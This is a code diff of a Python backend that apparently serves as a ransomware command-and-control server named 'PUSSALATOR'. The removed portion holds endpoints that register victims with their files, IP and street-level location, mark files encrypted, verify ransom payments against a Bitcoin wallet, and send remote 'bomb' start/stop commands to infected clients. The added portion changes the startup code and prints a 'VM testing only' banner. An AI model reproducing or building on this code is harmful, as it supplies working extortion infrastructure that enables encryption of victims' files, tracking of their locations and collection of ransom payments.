-    user_agent = request.headers.get('user-agent', '')
-    
-    # Reject requests with no user agent or suspicious user agents
-    if not user_agent or 'python-requests' in user_agent.lower():
-        logger.warning(f"Blocked suspicious registration attempt from {request.client.host}")
-        raise HTTPException(status_code=403, detail="Forbidden")
-    
-    return db.add_victim(
-        victim_id=victim.victim_id,
-        files=victim.files,
-        hostname=victim.hostname,
-        ip=victim.ip or request.client.host,
-        country=victim.country,
-        region=victim.region,
-        city=victim.city,
-        zip_code=victim.zip,
-        street=victim.street,
-        lat=victim.lat,
-        lon=victim.lon,
-        isp=victim.isp,
-        organization=victim.organization,
-        os_info=victim.os
-    )
-
-@app.post('/api/update-victim')
-async def update_victim(req: Request):
-    data = await req.json()
-    success = db.update_victim(data.get('victim_id'), {'files': data.get('files_encrypted')})
-    return {'success': success}
-
-@app.post('/api/verify-payment')
-async def verify_payment(payment: PaymentVerify):
-    success = db.verify_payment(payment.victim_id, payment.tx_id)
-    return {'success': success}
-
-@app.delete('/api/victim/{vid}')
-async def delete_victim(vid: str):
-    success = db.delete_victim(vid)
-    return {'success': success}
-
-# ============================================================================
-# BOMB API
-# ============================================================================
-
-@app.post('/api/bomb/start')
-async def bomb_start(bomb: BombStart):
-    db.add_bomb_command(bomb.client_id, {
-        'action': 'start',
-        'filename': bomb.filename,
-        'timestamp': datetime.now().isoformat()
-    })
-    db.update_bomb_status(bomb.client_id, 'pending')
-    db.log('info', f"Bomb start command sent to {bomb.client_id}")
-    telegram.notify_bomb(bomb.client_id, "start")
-    return {'success': True}
-
-@app.post('/api/bomb/stop')
-async def bomb_stop(bomb: BombStop):
-    db.add_bomb_command(bomb.client_id, {
-        'action': 'stop',
-        'timestamp': datetime.now().isoformat()
-    })
-    db.log('info', f"Bomb stop command sent to {bomb.client_id}")
-    telegram.notify_bomb(bomb.client_id, "stop")
-    return {'success': True}
-
-@app.get('/api/bomb/command/{client_id}')
-async def get_bomb_command(client_id: str):
-    cmd = db.get_bomb_command(client_id)
-    if cmd:
-        return cmd
-    return {'action': 'none'}
-
-@app.post('/api/bomb/update')
-async def bomb_update(update: BombUpdate):
-    if update.error:
-        db.update_bomb_status(update.client_id, 'error')
-        db.log('error', f"Bomb error for {update.client_id}: {update.error}")
-    else:
-        status = 'active' if update.size_gb and update.size_gb > 0 else 'inactive'
-        db.update_bomb_status(update.client_id, status, update.size_gb or 0)
-        if update.size_gb and update.size_gb > 0:
-            db.log('info', f"Bomb progress for {update.client_id}: {update.size_gb:.2f} GB")
-    return {'success': True}
-
-# ============================================================================
-# OWNER API
-# ============================================================================
-
-@app.post('/api/owner/login')
-async def owner_login(login: OwnerLogin):
-    success = login.password == Config.OWNER_PASSWORD
-    return {'success': success}
-
-# ============================================================================
-# HEALTH CHECK
-# ============================================================================
-
-@app.get('/health')
-async def health():
-    return {
-        'status': 'ok',
-        'time': datetime.now().isoformat(),
-        'victims': len(db.get_all()),
-        'supabase': db.use_supabase,
-        'telegram': telegram.enabled,
-        'version': '1.0.0'
-    }
-
-# ============================================================================
 # MAIN
 # ============================================================================
 
-if __name__ == "__main__":
-    port = int(os.environ.get('PORT', 8000))
-    host = os.environ.get('HOST', '0.0.0.0')
+if __name__ == '__main__':
+    print("=" * 60)
+    print("PUSSALATOR - SUPABASE BACKEND")
+    print("=" * 60)
+    print(f"Supabase URL: {Config.SUPABASE_URL}")
+    print(f"Server: http://{Config.HOST}:{Config.PORT}")
+    print(f"Owner ID: {Config.OWNER_ID}")
+    print(f"Debug mode: {Config.DEBUG}")
+    print("=" * 60)
+    print("WARNING: For VM testing only!")
+    print("=" * 60)
     
-    logger.info("=" * 50)
-    logger.info("PUSSALATOR v1.0")
-    logger.info("=" * 50)
-    logger.info(f"Port: {port}")
-    logger.info(f"Host: {host}")
-    logger.info(f"Supabase: {'✅ Connected' if db.use_supabase else '❌ Not connected'}")
-    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
-    logger.info(f"Wallet: {Config.BTC_WALLET}")
-    logger.info("=" * 50)
+    # Test Supabase connection
+    try:
+        test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
+        print("[+] Supabase connection successful")
+    except Exception as e:
+        print(f"[-] Supabase connection failed: {e}")
+        print("Check your SUPABASE_URL and SUPABASE_KEY")
+        sys.exit(1)
     
-    uvicorn.run(
-        "main:app",
-        host=host,
-        port=port,
-        log_level=Config.LOG_LEVEL.lower(),
-        reload=Config.ENVIRONMENT == 'development'
+    app.run(
+        host=Config.HOST,
+        port=Config.PORT,
+        debug=Config.DEBUG
     )
